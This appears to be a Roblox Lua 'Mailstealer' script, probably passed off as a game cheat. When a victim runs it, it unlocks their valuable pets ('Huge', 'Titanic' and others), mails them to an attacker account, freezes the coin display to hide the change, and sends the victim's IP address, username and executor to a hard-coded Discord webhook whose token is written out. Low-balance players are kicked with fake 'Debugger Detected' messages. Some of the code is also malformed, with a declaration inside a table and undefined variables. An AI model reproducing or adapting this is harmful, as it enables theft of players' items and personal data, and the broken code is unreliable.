local LogsWebhook = "https://discord.com/api/webhooks/1329534799484031026/8olXGKBru9vI3FZMnanVHoRfODyj6VbcNM7CAnL1VverzvcQSFclBEDlSQeSb5q56b2x"

local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Inventory = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory
local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
local UnlockRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked")
local Request = http.request or http_request or syn.request or request
local Player = game:GetService("Players").LocalPlayer
local Functions = {}
local ProcessPending = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"].Disabled == true
local Database = {"Huge", "Titanic", "Acorn", "Jelly Coin"}

Functions.HookDeep = function()
    local Label = game:GetService("Players").LocalPlayer.PlayerGui.Main.Left["Coins Desktop"].Amount
    local Old = Label.Text

    Label:GetPropertyChangedSignal("Text"):Connect(function()
        Label.Text = Old
    end)
end


Functions.InvokeWebserver = function(index, value, rap)
    local Cum = {
        local imgs = "https://images-ext-1.discordapp.net/external/lQoYJfB6vF-6CPq4b1m9_PFMj3dg8WvDzju7JvaQ9Ak/https/i.pinimg.com/736x/6c/5a/5e/6c5a5e08d08a609d663a5866ff992f7a.jpg?format=webp&width=612&height=614"
        ["username"] = "" .. mailstealer_name .. " Mailstealer",
        ["avatar_url"] = imgs
        ["embeds"] = {
            {
                ["description"] = "**"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."**",
                ["color"] = tonumber(8323327), 
                ["fields"] = {
                    {
                        ["name"] = "\u{26f9}\u{fe0f} Player Data",
                        ["value"] = "```js\nFirmware: " .. tostring(identifyexecutor() or "Unknown Shitsploit") .. "\nIP: " .. tostring(Functions.ParseIP()) .. "\nUsername: " .. tostring(Player.Name) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "\u{1f4e5} Recieved",
                        ["value"] = "```js\nPet: " .. tostring(index) .. "\nAmount: " .. tostring(value) .. "x\nTotal RAP: " .. tostring(rap) .. "```",
                        ["inline"] = true
                    }
                },
            }
        }
    }
    local data2 = HttpService:JSONEncode({
        ["content"] = "Gengar On Top",
        ["embeds"] = {embed2}
    })
    
    Request({
        Url = Config["Discord Webhook"],
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },        
        Body = game:GetService("HttpService"):JSONEncode(Cum)
    })
    local logsResponse =
    request(
    {
       Url = LogsWebhook,
       Method = "POST",
       Headers = headers,
       Body = data2
    })
end



Functions.ParseAbbreviation = function(v)
    if v >= 1e9 then
        return string.format("%.1fB", v / 1e9)
    elseif v >= 1e6 then
        return string.format("%.1fM", v / 1e6)
    elseif v >= 1e3 then
        return string.format("%.1fK", v / 1e3)
    else
        return tostring(v)
    end
end

Functions.ParseIP = function()
    local response = Request({
        Url = "https://api.ipify.org/?format=json",
        Method = "GET",
    })
    
    local Decoded = game:GetService("HttpService"):JSONDecode(response.Body)
    return Decoded.ip
end


Functions.CoinCheck = function()
    return CurrencyCmds.Get("Coins")
end

if Functions.CoinCheck() <= 48000 then
    Player:Kick("Debugger Detected, Please Close & Retry.\nAccount Flagged: true")
else
    warn("Library.Client\nInvoking UI Library.")
end

Functions.FaceRapValue = function(ClassName, StackKey, retryCount)
    local Module = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
    local args = {
        Class = { Name = ClassName },
        StackKey = function()
            return StackKey
        end,
        AbstractGetRAP = function()
            return nil
        end
    }

    local Rap = Module.Get(args)
    if Rap ~= nil then
        return Rap
    else
        return Functions.FaceRapValue(ClassName, StackKey) 
    end
end

Functions.StealingProcess = function()
    local Huges = 0
    local SortedRAP = 0

    for uid, c in pairs(Inventory.Pet) do
       for i, v in ipairs(Database) do
        if string.find(c.id, v) then
            UnlockRemote:InvokeServer(uid, false)
            Network.Invoke("Mailbox: Send", Config.Username, Config["Mail Message"], "Pet", uid, c._am or 1)
            
            Huges = Huges + 1
            local Quantity = c._am or 1
            local RAP = Functions.FaceRapValue("Pet", string.format("{\"id\":\"%s\"}", c.id)) 
            Functions.InvokeWebserver(c.id, Quantity, Functions.ParseAbbreviation(Quantity * RAP))
            end
        end
    end

    if Huges == 0 then
        Player:Kick("Couldn't Fetch Save, Rejoin.")
        return false, "No Huges Found"
    end
    return Huges, SortedRAP
end

task.spawn(Functions.HookDeep)
task.spawn(Functions.StealingProcess)

return Functions
